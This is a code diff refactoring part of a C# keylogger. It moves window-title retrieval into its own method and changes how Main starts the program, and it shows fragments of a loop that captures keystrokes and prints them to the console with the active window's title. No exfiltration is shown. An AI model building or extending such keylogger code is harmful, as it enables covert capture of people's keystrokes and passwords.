@@ -10,7 +10,7 @@ using System.Windows.Forms;
 
 namespace Keylogger
 {
-    static class Program
+    class Program
     {
         // Get keys
         [DllImport("user32.dll")]
@@ -23,10 +23,13 @@ namespace Keylogger
         [DllImport("user32.dll")]
         static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 
-
-
-
         static void Main(string[] args)
+        {
+            new Program().start();
+        }
+
+
+        private void start()
         {
             bool isShift = false;
             bool isCapital = false;
@@ -119,28 +122,30 @@ namespace Keylogger
 
                         Console.WriteLine(text);
 
-                        const int nChars = 256;
-                        StringBuilder Buff = new StringBuilder(nChars);
-                        IntPtr handle = GetForegroundWindow();
-                        string windowTitle = "";
-                        if (GetWindowText(handle, Buff, nChars) > 0)
-                        {
-                            windowTitle = Buff.ToString();
-                        }
-                            
+                        
+
+                        string windowTitle = getForegroundWindowTitle();
                         Console.WriteLine("windowTitle : " + windowTitle);
                     }
                 }
             }
-
         }
 
-        
+
+        public string getForegroundWindowTitle()
+        {
+            const int nChars = 256;
+            StringBuilder Buff = new StringBuilder(nChars);
+            IntPtr handle = GetForegroundWindow();
+            string windowTitle = "";
+            if (GetWindowText(handle, Buff, nChars) > 0)
+            {
+                windowTitle = Buff.ToString();
+            }
+            return windowTitle;
+        }
 
     }
 
-    public string GetundWindowTitle()
-    {
-        return "test";
-    }
+   
 }
